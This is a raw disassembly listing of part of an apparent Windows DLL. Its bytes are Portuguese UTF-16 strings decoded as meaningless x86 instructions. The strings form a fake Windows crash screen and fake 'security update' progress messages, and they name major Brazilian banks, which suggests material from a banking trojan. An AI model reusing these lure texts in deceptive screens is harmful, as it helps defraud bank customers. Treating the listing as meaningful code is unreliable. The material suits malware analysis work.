10007879:	00 72 00             	add    %dh,0x0(%edx)
1000787c:	61                   	popa
1000787d:	00 6e 00             	add    %ch,0x0(%esi)
10007880:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10007884:	20 00                	and    %al,(%eax)
10007886:	6f                   	outsl  %ds:(%esi),(%dx)
10007887:	00 20                	add    %ah,(%eax)
10007889:	00 57 00             	add    %dl,0x0(%edi)
1000788c:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
10007892:	6f                   	outsl  %ds:(%esi),(%dx)
10007893:	00 77 00             	add    %dh,0x0(%edi)
10007896:	73 00                	jae    0x10007898
10007898:	00 05 3a 00 28 00    	add    %al,0x28003a
1000789e:	00 80 f5 53 00 65    	add    %al,0x650053f5(%eax)
100078a4:	00 75 00             	add    %dh,0x0(%ebp)
100078a7:	20 00                	and    %al,(%eax)
100078a9:	50                   	push   %eax
100078aa:	00 43 00             	add    %al,0x0(%ebx)
100078ad:	20 00                	and    %al,(%eax)
100078af:	74 00                	je     0x100078b1
100078b1:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
100078b5:	65 00 20             	add    %ah,%gs:(%eax)
100078b8:	00 75 00             	add    %dh,0x0(%ebp)
100078bb:	6d                   	insl   (%dx),%es:(%edi)
100078bc:	00 20                	add    %ah,(%eax)
100078be:	00 70 00             	add    %dh,0x0(%eax)
100078c1:	72 00                	jb     0x100078c3
100078c3:	6f                   	outsl  %ds:(%esi),(%dx)
100078c4:	00 62 00             	add    %ah,0x0(%edx)
100078c7:	6c                   	insb   (%dx),%es:(%edi)
100078c8:	00 65 00             	add    %ah,0x0(%ebp)
100078cb:	6d                   	insl   (%dx),%es:(%edi)
100078cc:	00 61 00             	add    %ah,0x0(%ecx)
100078cf:	20 00                	and    %al,(%eax)
100078d1:	65 00 20             	add    %ah,%gs:(%eax)
100078d4:	00 70 00             	add    %dh,0x0(%eax)
100078d7:	72 00                	jb     0x100078d9
100078d9:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
100078dd:	69 00 73 00 61 00    	imul   $0x610073,(%eax),%eax
100078e3:	20 00                	and    %al,(%eax)
100078e5:	73 00                	jae    0x100078e7
100078e7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
100078eb:	20 00                	and    %al,(%eax)
100078ed:	72 00                	jb     0x100078ef
100078ef:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
100078f3:	6e                   	outsb  %ds:(%esi),(%dx)
100078f4:	00 69 00             	add    %ch,0x0(%ecx)
100078f7:	63 00                	arpl   %eax,(%eax)
100078f9:	69 00 61 00 64 00    	imul   $0x640061,(%eax),%eax
100078ff:	6f                   	outsl  %ds:(%esi),(%dx)
10007900:	00 2e                	add    %ch,(%esi)
10007902:	00 0a                	add    %cl,(%edx)
10007904:	00 45 00             	add    %al,0x0(%ebp)
10007907:	73 00                	jae    0x10007909
10007909:	74 00                	je     0x1000790b
1000790b:	61                   	popa
1000790c:	00 6d 00             	add    %ch,0x0(%ebp)
1000790f:	6f                   	outsl  %ds:(%esi),(%dx)
10007910:	00 73 00             	add    %dh,0x0(%ebx)
10007913:	20 00                	and    %al,(%eax)
10007915:	63 00                	arpl   %eax,(%eax)
10007917:	6f                   	outsl  %ds:(%esi),(%dx)
10007918:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
1000791c:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
10007920:	00 6e 00             	add    %ch,0x0(%esi)
10007923:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10007927:	20 00                	and    %al,(%eax)
10007929:	61                   	popa
1000792a:	00 6c 00 67          	add    %ch,0x67(%eax,%eax,1)
1000792e:	00 75 00             	add    %dh,0x0(%ebp)
10007931:	6d                   	insl   (%dx),%es:(%edi)
10007932:	00 61 00             	add    %ah,0x0(%ecx)
10007935:	73 00                	jae    0x10007937
10007937:	20 00                	and    %al,(%eax)
10007939:	69 00 6e 00 66 00    	imul   $0x66006e,(%eax),%eax
1000793f:	6f                   	outsl  %ds:(%esi),(%dx)
10007940:	00 72 00             	add    %dh,0x0(%edx)
10007943:	6d                   	insl   (%dx),%es:(%edi)
10007944:	00 61 00             	add    %ah,0x0(%ecx)
10007947:	63 00                	arpl   %eax,(%eax)
10007949:	6f                   	outsl  %ds:(%esi),(%dx)
1000794a:	00 65 00             	add    %ah,0x0(%ebp)
1000794d:	73 00                	jae    0x1000794f
1000794f:	20 00                	and    %al,(%eax)
10007951:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10007955:	20 00                	and    %al,(%eax)
10007957:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
1000795b:	72 00                	jb     0x1000795d
1000795d:	6f                   	outsl  %ds:(%esi),(%dx)
1000795e:	00 0a                	add    %cl,(%edx)
10007960:	00 65 00             	add    %ah,0x0(%ebp)
10007963:	20 00                	and    %al,(%eax)
10007965:	72 00                	jb     0x10007967
10007967:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
1000796b:	6e                   	outsb  %ds:(%esi),(%dx)
1000796c:	00 69 00             	add    %ch,0x0(%ecx)
1000796f:	63 00                	arpl   %eax,(%eax)
10007971:	69 00 61 00 72 00    	imul   $0x720061,(%eax),%eax
10007977:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
1000797b:	6f                   	outsl  %ds:(%esi),(%dx)
1000797c:	00 73 00             	add    %dh,0x0(%ebx)
1000797f:	20 00                	and    %al,(%eax)
10007981:	70 00                	jo     0x10007983
10007983:	61                   	popa
10007984:	00 72 00             	add    %dh,0x0(%edx)
10007987:	61                   	popa
10007988:	00 20                	add    %ah,(%eax)
1000798a:	00 76 00             	add    %dh,0x0(%esi)
1000798d:	6f                   	outsl  %ds:(%esi),(%dx)
1000798e:	00 63 00             	add    %ah,0x0(%ebx)
10007991:	65 00 2e             	add    %ch,%gs:(%esi)
10007994:	00 00                	add    %al,(%eax)
10007996:	4f                   	dec    %edi
10007997:	56                   	push   %esi
10007998:	00 65 00             	add    %ah,0x0(%ebp)
1000799b:	72 00                	jb     0x1000799d
1000799d:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
100079a3:	63 00                	arpl   %eax,(%eax)
100079a5:	61                   	popa
100079a6:	00 6e 00             	add    %ch,0x0(%esi)
100079a9:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
100079ad:	20 00                	and    %al,(%eax)
100079af:	65 00 20             	add    %ah,%gs:(%eax)
100079b2:	00 72 00             	add    %dh,0x0(%edx)
100079b5:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
100079b9:	61                   	popa
100079ba:	00 72 00             	add    %dh,0x0(%edx)
100079bd:	61                   	popa
100079be:	00 6e 00             	add    %ch,0x0(%esi)
100079c1:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
100079c5:	20 00                	and    %al,(%eax)
100079c7:	61                   	popa
100079c8:	00 20                	add    %ah,(%eax)
100079ca:	00 75 00             	add    %dh,0x0(%ebp)
100079cd:	6e                   	outsb  %ds:(%esi),(%dx)
100079ce:	00 69 00             	add    %ch,0x0(%ecx)
100079d1:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
100079d5:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
100079d9:	20 00                	and    %al,(%eax)
100079db:	28 00                	sub    %al,(%eax)
100079dd:	43                   	inc    %ebx
100079de:	00 3a                	add    %bh,(%edx)
100079e0:	00 29                	add    %ch,(%ecx)
100079e2:	00 3a                	add    %bh,(%edx)
100079e4:	00 00                	add    %al,(%eax)
100079e6:	11 43 00             	adc    %eax,0x0(%ebx)
100079e9:	6f                   	outsl  %ds:(%esi),(%dx)
100079ea:	00 6e 00             	add    %ch,0x0(%esi)
100079ed:	73 00                	jae    0x100079ef
100079ef:	6f                   	outsl  %ds:(%esi),(%dx)
100079f0:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
100079f4:	00 73 00             	add    %dh,0x0(%ebx)
100079f7:	00 1b                	add    %bl,(%ebx)
100079f9:	30 00                	xor    %al,(%eax)
100079fb:	25 00 20 00 63       	and    $0x63002000,%eax
10007a00:	00 6f 00             	add    %ch,0x0(%edi)
10007a03:	6e                   	outsb  %ds:(%esi),(%dx)
10007a04:	00 63 00             	add    %ah,0x0(%ebx)
10007a07:	6c                   	insb   (%dx),%es:(%edi)
10007a08:	00 75 00             	add    %dh,0x0(%ebp)
10007a0b:	69 00 64 00 6f 00    	imul   $0x6f0064,(%eax),%eax
10007a11:	2e 00 00             	add    %al,%cs:(%eax)
10007a14:	80 bb 49 00 73 00 73 	cmpb   $0x73,0x730049(%ebx)
10007a1b:	00 6f 00             	add    %ch,0x0(%edi)
10007a1e:	20 00                	and    %al,(%eax)
10007a20:	70 00                	jo     0x10007a22
10007a22:	6f                   	outsl  %ds:(%esi),(%dx)
10007a23:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
10007a27:	00 20                	add    %ah,(%eax)
10007a29:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
10007a2d:	00 76 00             	add    %dh,0x0(%esi)
10007a30:	61                   	popa
10007a31:	00 72 00             	add    %dh,0x0(%edx)
10007a34:	20 00                	and    %al,(%eax)
10007a36:	6d                   	insl   (%dx),%es:(%edi)
10007a37:	00 61 00             	add    %ah,0x0(%ecx)
10007a3a:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
10007a40:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10007a44:	20 00                	and    %al,(%eax)
10007a46:	75 00                	jne    0x10007a48
10007a48:	6d                   	insl   (%dx),%es:(%edi)
10007a49:	00 61 00             	add    %ah,0x0(%ecx)
10007a4c:	20 00                	and    %al,(%eax)
10007a4e:	68 00 6f 00 72       	push   $0x72006f00
10007a53:	00 61 00             	add    %ah,0x0(%ecx)
10007a56:	20 00                	and    %al,(%eax)
10007a58:	70 00                	jo     0x10007a5a
10007a5a:	61                   	popa
10007a5b:	00 72 00             	add    %dh,0x0(%edx)
10007a5e:	61                   	popa
10007a5f:	00 20                	add    %ah,(%eax)
10007a61:	00 73 00             	add    %dh,0x0(%ebx)
10007a64:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
10007a68:	20 00                	and    %al,(%eax)
10007a6a:	63 00                	arpl   %eax,(%eax)
10007a6c:	6f                   	outsl  %ds:(%esi),(%dx)
10007a6d:	00 6e 00             	add    %ch,0x0(%esi)
10007a70:	63 00                	arpl   %eax,(%eax)
10007a72:	6c                   	insb   (%dx),%es:(%edi)
10007a73:	00 75 00             	add    %dh,0x0(%ebp)
10007a76:	69 00 64 00 6f 00    	imul   $0x6f0064,(%eax),%eax
10007a7c:	2e 00 0a             	add    %cl,%cs:(%edx)
10007a7f:	00 4e 00             	add    %cl,0x0(%esi)
10007a82:	61                   	popa
10007a83:	00 6f 00             	add    %ch,0x0(%edi)
10007a86:	20 00                	and    %al,(%eax)
10007a88:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10007a8c:	73 00                	jae    0x10007a8e
10007a8e:	6c                   	insb   (%dx),%es:(%edi)
10007a8f:	00 69 00             	add    %ch,0x0(%ecx)
10007a92:	67 00 75 00          	add    %dh,0x0(%di)
10007a96:	65 00 20             	add    %ah,%gs:(%eax)
10007a99:	00 6f 00             	add    %ch,0x0(%edi)
10007a9c:	75 00                	jne    0x10007a9e
10007a9e:	20 00                	and    %al,(%eax)
10007aa0:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10007aa4:	73 00                	jae    0x10007aa6
10007aa6:	63 00                	arpl   %eax,(%eax)
10007aa8:	6f                   	outsl  %ds:(%esi),(%dx)
10007aa9:	00 6e 00             	add    %ch,0x0(%esi)
10007aac:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
10007ab0:	74 00                	je     0x10007ab2
10007ab2:	65 00 20             	add    %ah,%gs:(%eax)
10007ab5:	00 6f 00             	add    %ch,0x0(%edi)
10007ab8:	20 00                	and    %al,(%eax)
10007aba:	63 00                	arpl   %eax,(%eax)
10007abc:	6f                   	outsl  %ds:(%esi),(%dx)
10007abd:	00 6d 00             	add    %ch,0x0(%ebp)
10007ac0:	70 00                	jo     0x10007ac2
10007ac2:	75 00                	jne    0x10007ac4
10007ac4:	74 00                	je     0x10007ac6
10007ac6:	61                   	popa
10007ac7:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10007acb:	00 72 00             	add    %dh,0x0(%edx)
10007ace:	2e 00 00             	add    %al,%cs:(%eax)
10007ad1:	09 49 00             	or     %ecx,0x0(%ecx)
10007ad4:	74 00                	je     0x10007ad6
10007ad6:	61                   	popa
10007ad7:	00 75 00             	add    %dh,0x0(%ebp)
10007ada:	00 11                	add    %dl,(%ecx)
10007adc:	42                   	inc    %edx
10007add:	00 72 00             	add    %dh,0x0(%edx)
10007ae0:	61                   	popa
10007ae1:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
10007ae5:	00 73 00             	add    %dh,0x0(%ebx)
10007ae8:	63 00                	arpl   %eax,(%eax)
10007aea:	6f                   	outsl  %ds:(%esi),(%dx)
10007aeb:	00 00                	add    %al,(%eax)
10007aed:	13 53 00             	adc    0x0(%ebx),%edx
10007af0:	61                   	popa
10007af1:	00 6e 00             	add    %ch,0x0(%esi)
10007af4:	74 00                	je     0x10007af6
10007af6:	61                   	popa
10007af7:	00 6e 00             	add    %ch,0x0(%esi)
10007afa:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10007afe:	72 00                	jb     0x10007b00
10007b00:	00 1f                	add    %bl,(%edi)
10007b02:	42                   	inc    %edx
10007b03:	00 61 00             	add    %ah,0x0(%ecx)
10007b06:	6e                   	outsb  %ds:(%esi),(%dx)
10007b07:	00 63 00             	add    %ah,0x0(%ebx)
10007b0a:	6f                   	outsl  %ds:(%esi),(%dx)
10007b0b:	00 20                	add    %ah,(%eax)
10007b0d:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10007b11:	00 20                	add    %ah,(%eax)
10007b13:	00 42 00             	add    %al,0x0(%edx)
10007b16:	72 00                	jb     0x10007b18
10007b18:	61                   	popa
10007b19:	00 73 00             	add    %dh,0x0(%ebx)
10007b1c:	69 00 6c 00 00 1f    	imul   $0x1f00006c,(%eax),%eax
10007b22:	43                   	inc    %ebx
10007b23:	00 61 00             	add    %ah,0x0(%ecx)
10007b26:	69 00 78 00 61 00    	imul   $0x610078,(%eax),%eax
10007b2c:	20 00                	and    %al,(%eax)
10007b2e:	45                   	inc    %ebp
10007b2f:	00 63 00             	add    %ah,0x0(%ebx)
10007b32:	6f                   	outsl  %ds:(%esi),(%dx)
10007b33:	00 6e 00             	add    %ch,0x0(%esi)
10007b36:	6f                   	outsl  %ds:(%esi),(%dx)
10007b37:	00 6d 00             	add    %ch,0x0(%ebp)
10007b3a:	69 00 63 00 61 00    	imul   $0x610063,(%eax),%eax
10007b40:	00 31                	add    %dh,(%ecx)
10007b42:	41                   	inc    %ecx
10007b43:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
10007b47:	00 61 00             	add    %ah,0x0(%ecx)
10007b4a:	6c                   	insb   (%dx),%es:(%edi)
10007b4b:	00 69 00             	add    %ch,0x0(%ecx)
10007b4e:	7a 00                	jp     0x10007b50
10007b50:	61                   	popa
10007b51:	00 63 00             	add    %ah,0x0(%ebx)
10007b54:	61                   	popa
10007b55:	00 6f 00             	add    %ch,0x0(%edi)
10007b58:	20 00                	and    %al,(%eax)
10007b5a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10007b5e:	20 00                	and    %al,(%eax)
10007b60:	53                   	push   %ebx
10007b61:	00 65 00             	add    %ah,0x0(%ebp)
10007b64:	67 00 75 00          	add    %dh,0x0(%di)
10007b68:	72 00                	jb     0x10007b6a
10007b6a:	61                   	popa
10007b6b:	00 6e 00             	add    %ch,0x0(%esi)
10007b6e:	63 00                	arpl   %eax,(%eax)
10007b70:	61                   	popa
10007b71:	00 00                	add    %al,(%eax)
10007b73:	05 30 00 25 00       	add    $0x250030,%eax
10007b78:	00 41 43             	add    %al,0x43(%ecx)
10007b7b:	00 6f 00             	add    %ch,0x0(%edi)
10007b7e:	6e                   	outsb  %ds:(%esi),(%dx)
10007b7f:	00 65 00             	add    %ah,0x0(%ebp)
10007b82:	63 00                	arpl   %eax,(%eax)
10007b84:	74 00                	je     0x10007b86
10007b86:	61                   	popa
10007b87:	00 6e 00             	add    %ch,0x0(%esi)
10007b8a:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10007b8e:	20 00                	and    %al,(%eax)
10007b90:	61                   	popa
10007b91:	00 6f 00             	add    %ch,0x0(%edi)
10007b94:	20 00                	and    %al,(%eax)
10007b96:	73 00                	jae    0x10007b98
10007b98:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
10007b9c:	76 00                	jbe    0x10007b9e
10007b9e:	69 00 64 00 6f 00    	imul   $0x6f0064,(%eax),%eax
10007ba4:	72 00                	jb     0x10007ba6
10007ba6:	20 00                	and    %al,(%eax)
10007ba8:	73 00                	jae    0x10007baa
10007baa:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
10007bae:	75 00                	jne    0x10007bb0
10007bb0:	72 00                	jb     0x10007bb2
10007bb2:	6f                   	outsl  %ds:(%esi),(%dx)
10007bb3:	00 2e                	add    %ch,(%esi)
10007bb5:	00 2e                	add    %ch,(%esi)
10007bb7:	00 2e                	add    %ch,(%esi)
10007bb9:	00 00                	add    %al,(%eax)
10007bbb:	07                   	pop    %es
10007bbc:	20 00                	and    %al,(%eax)
10007bbe:	2a 00                	sub    (%eax),%al
10007bc0:	20 00                	and    %al,(%eax)
10007bc2:	00 49 56             	add    %cl,0x56(%ecx)
10007bc5:	00 65 00             	add    %ah,0x0(%ebp)
10007bc8:	72 00                	jb     0x10007bca
10007bca:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
10007bd0:	63 00                	arpl   %eax,(%eax)
10007bd2:	61                   	popa
10007bd3:	00 6e 00             	add    %ch,0x0(%esi)
10007bd6:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10007bda:	20 00                	and    %al,(%eax)
10007bdc:	63 00                	arpl   %eax,(%eax)
10007bde:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
10007be2:	74 00                	je     0x10007be4
10007be4:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
10007bea:	63 00                	arpl   %eax,(%eax)
10007bec:	61                   	popa
10007bed:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10007bf1:	00 73 00             	add    %dh,0x0(%ebx)
10007bf4:	20 00                	and    %al,(%eax)
10007bf6:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
10007bfa:	67 00 69 00          	add    %ch,0x0(%bx,%di)
10007bfe:	74 00                	je     0x10007c00
10007c00:	61                   	popa
10007c01:	00 69 00             	add    %ch,0x0(%ecx)
10007c04:	73 00                	jae    0x10007c06
10007c06:	2e 00 2e             	add    %ch,%cs:(%esi)
10007c09:	00 2e                	add    %ch,(%esi)
10007c0b:	00 00                	add    %al,(%eax)
10007c0d:	49                   	dec    %ecx
10007c0e:	42                   	inc    %edx
10007c0f:	00 61 00             	add    %ah,0x0(%ecx)
10007c12:	69 00 78 00 61 00    	imul   $0x610078,(%eax),%eax
10007c18:	6e                   	outsb  %ds:(%esi),(%dx)
10007c19:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10007c1d:	00 20                	add    %ah,(%eax)
10007c1f:	00 63 00             	add    %ah,0x0(%ebx)
10007c22:	6f                   	outsl  %ds:(%esi),(%dx)
10007c23:	00 6d 00             	add    %ch,0x0(%ebp)
10007c26:	70 00                	jo     0x10007c28
10007c28:	6f                   	outsl  %ds:(%esi),(%dx)
10007c29:	00 6e 00             	add    %ch,0x0(%esi)
10007c2c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
10007c30:	74 00                	je     0x10007c32
10007c32:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
10007c36:	20 00                	and    %al,(%eax)
10007c38:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10007c3c:	20 00                	and    %al,(%eax)
10007c3e:	73 00                	jae    0x10007c40
10007c40:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
10007c44:	75 00                	jne    0x10007c46
10007c46:	72 00                	jb     0x10007c48
10007c48:	61                   	popa
10007c49:	00 6e 00             	add    %ch,0x0(%esi)
10007c4c:	63 00                	arpl   %eax,(%eax)
10007c4e:	61                   	popa
10007c4f:	00 2e                	add    %ch,(%esi)
10007c51:	00 2e                	add    %ch,(%esi)
10007c53:	00 2e                	add    %ch,(%esi)
10007c55:	00 00                	add    %al,(%eax)
10007c57:	3f                   	aas
10007c58:	56                   	push   %esi
10007c59:	00 61 00             	add    %ah,0x0(%ecx)
10007c5c:	6c                   	insb   (%dx),%es:(%edi)
10007c5d:	00 69 00             	add    %ch,0x0(%ecx)
10007c60:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
10007c64:	6e                   	outsb  %ds:(%esi),(%dx)
10007c65:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10007c69:	00 20                	add    %ah,(%eax)
10007c6b:	00 6d 00             	add    %ch,0x0(%ebp)
10007c6e:	6f                   	outsl  %ds:(%esi),(%dx)
10007c6f:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
10007c73:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
10007c77:	00 20                	add    %ah,(%eax)
10007c79:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
10007c7d:	00 20                	add    %ah,(%eax)
10007c7f:	00 70 00             	add    %dh,0x0(%eax)
10007c82:	72 00                	jb     0x10007c84
10007c84:	6f                   	outsl  %ds:(%esi),(%dx)
10007c85:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
10007c89:	00 63 00             	add    %ah,0x0(%ebx)
10007c8c:	61                   	popa
10007c8d:	00 6f 00             	add    %ch,0x0(%edi)
10007c90:	2e 00 2e             	add    %ch,%cs:(%esi)
10007c93:	00 2e                	add    %ch,(%esi)
10007c95:	00 00                	add    %al,(%eax)
10007c97:	39 41 00             	cmp    %eax,0x0(%ecx)
10007c9a:	74 00                	je     0x10007c9c
10007c9c:	75 00                	jne    0x10007c9e
10007c9e:	61                   	popa
10007c9f:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
10007ca3:	00 7a 00             	add    %bh,0x0(%edx)
10007ca6:	61                   	popa
10007ca7:	00 6e 00             	add    %ch,0x0(%esi)
10007caa:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10007cae:	20 00                	and    %al,(%eax)
10007cb0:	63 00                	arpl   %eax,(%eax)
10007cb2:	6f                   	outsl  %ds:(%esi),(%dx)
10007cb3:	00 6e 00             	add    %ch,0x0(%esi)
10007cb6:	66 00 69 00          	data16 add %ch,0x0(%ecx)
10007cba:	67 00 75 00          	add    %dh,0x0(%di)
10007cbe:	72 00                	jb     0x10007cc0
10007cc0:	61                   	popa
10007cc1:	00 63 00             	add    %ah,0x0(%ebx)
10007cc4:	6f                   	outsl  %ds:(%esi),(%dx)
10007cc5:	00 65 00             	add    %ah,0x0(%ebp)
10007cc8:	73 00                	jae    0x10007cca
10007cca:	2e 00 2e             	add    %ch,%cs:(%esi)
10007ccd:	00 2e                	add    %ch,(%esi)
10007ccf:	00 00                	add    %al,(%eax)
10007cd1:	2d 53 00 69 00       	sub    $0x690053,%eax
10007cd6:	6e                   	outsb  %ds:(%esi),(%dx)
10007cd7:	00 63 00             	add    %ah,0x0(%ebx)
10007cda:	72 00                	jb     0x10007cdc
10007cdc:	6f                   	outsl  %ds:(%esi),(%dx)
10007cdd:	00 6e 00             	add    %ch,0x0(%esi)
10007ce0:	69 00 7a 00 61 00    	imul   $0x61007a,(%eax),%eax
10007ce6:	6e                   	outsb  %ds:(%esi),(%dx)
10007ce7:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10007ceb:	00 20                	add    %ah,(%eax)
10007ced:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
10007cf1:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10007cf5:	00 73 00             	add    %dh,0x0(%ebx)
10007cf8:	2e 00 2e             	add    %ch,%cs:(%esi)
10007cfb:	00 2e                	add    %ch,(%esi)
10007cfd:	00 00                	add    %al,(%eax)
10007cff:	4b                   	dec    %ebx
10007d00:	56                   	push   %esi
10007d01:	00 65 00             	add    %ah,0x0(%ebp)
10007d04:	72 00                	jb     0x10007d06
10007d06:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
10007d0c:	63 00                	arpl   %eax,(%eax)
10007d0e:	61                   	popa
10007d0f:	00 6e 00             	add    %ch,0x0(%esi)
10007d12:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10007d16:	20 00                	and    %al,(%eax)
10007d18:	69 00 6e 00 74 00    	imul   $0x74006e,(%eax),%eax
10007d1e:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
10007d22:	72 00                	jb     0x10007d24
10007d24:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
10007d2a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10007d2e:	20 00                	and    %al,(%eax)
10007d30:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10007d34:	20 00                	and    %al,(%eax)
10007d36:	73 00                	jae    0x10007d38
10007d38:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
10007d3e:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10007d42:	61                   	popa
10007d43:	00 2e                	add    %ch,(%esi)
10007d45:	00 2e                	add    %ch,(%esi)
10007d47:	00 2e                	add    %ch,(%esi)
10007d49:	00 00                	add    %al,(%eax)
10007d4b:	4d                   	dec    %ebp
10007d4c:	41                   	inc    %ecx
10007d4d:	00 70 00             	add    %dh,0x0(%eax)
10007d50:	6c                   	insb   (%dx),%es:(%edi)
10007d51:	00 69 00             	add    %ch,0x0(%ecx)
10007d54:	63 00                	arpl   %eax,(%eax)
10007d56:	61                   	popa
10007d57:	00 6e 00             	add    %ch,0x0(%esi)
10007d5a:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10007d5e:	20 00                	and    %al,(%eax)
10007d60:	61                   	popa
10007d61:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
10007d65:	00 61 00             	add    %ah,0x0(%ecx)
10007d68:	6c                   	insb   (%dx),%es:(%edi)
10007d69:	00 69 00             	add    %ch,0x0(%ecx)
10007d6c:	7a 00                	jp     0x10007d6e
10007d6e:	61                   	popa
10007d6f:	00 63 00             	add    %ah,0x0(%ebx)
10007d72:	6f                   	outsl  %ds:(%esi),(%dx)
10007d73:	00 65 00             	add    %ah,0x0(%ebp)
10007d76:	73 00                	jae    0x10007d78
10007d78:	20 00                	and    %al,(%eax)
10007d7a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10007d7e:	20 00                	and    %al,(%eax)
10007d80:	73 00                	jae    0x10007d82
10007d82:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
10007d86:	75 00                	jne    0x10007d88
10007d88:	72 00                	jb     0x10007d8a
10007d8a:	61                   	popa
10007d8b:	00 6e 00             	add    %ch,0x0(%esi)
10007d8e:	63 00                	arpl   %eax,(%eax)
10007d90:	61                   	popa
10007d91:	00 2e                	add    %ch,(%esi)
10007d93:	00 2e                	add    %ch,(%esi)
10007d95:	00 2e                	add    %ch,(%esi)
10007d97:	00 00                	add    %al,(%eax)
10007d99:	35 52 00 65 00       	xor    $0x650052,%eax
10007d9e:	67 00 69 00          	add    %ch,0x0(%bx,%di)
10007da2:	73 00                	jae    0x10007da4
10007da4:	74 00                	je     0x10007da6
10007da6:	72 00                	jb     0x10007da8
10007da8:	61                   	popa
10007da9:	00 6e 00             	add    %ch,0x0(%esi)
10007dac:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10007db0:	20 00                	and    %al,(%eax)
10007db2:	63 00                	arpl   %eax,(%eax)
10007db4:	6f                   	outsl  %ds:(%esi),(%dx)
10007db5:	00 6d 00             	add    %ch,0x0(%ebp)
10007db8:	70 00                	jo     0x10007dba
10007dba:	6f                   	outsl  %ds:(%esi),(%dx)
10007dbb:	00 6e 00             	add    %ch,0x0(%esi)
10007dbe:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
10007dc2:	74 00                	je     0x10007dc4
10007dc4:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
10007dc8:	2e 00 2e             	add    %ch,%cs:(%esi)
10007dcb:	00 2e                	add    %ch,(%esi)
10007dcd:	00 00                	add    %al,(%eax)
10007dcf:	33 46 00             	xor    0x0(%esi),%eax
10007dd2:	69 00 6e 00 61 00    	imul   $0x61006e,(%eax),%eax
10007dd8:	6c                   	insb   (%dx),%es:(%edi)
10007dd9:	00 69 00             	add    %ch,0x0(%ecx)
10007ddc:	7a 00                	jp     0x10007dde
10007dde:	61                   	popa
10007ddf:	00 6e 00             	add    %ch,0x0(%esi)
10007de2:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10007de6:	20 00                	and    %al,(%eax)
10007de8:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
10007dee:	74 00                	je     0x10007df0
10007df0:	61                   	popa
10007df1:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
10007df5:	00 63 00             	add    %ah,0x0(%ebx)
10007df8:	61                   	popa
10007df9:	00 6f 00             	add    %ch,0x0(%edi)
10007dfc:	2e 00 2e             	add    %ch,%cs:(%esi)
10007dff:	00 2e                	add    %ch,(%esi)
10007e01:	00 00                	add    %al,(%eax)
10007e03:	0b 43 00             	or     0x0(%ebx),%eax
10007e06:	61                   	popa
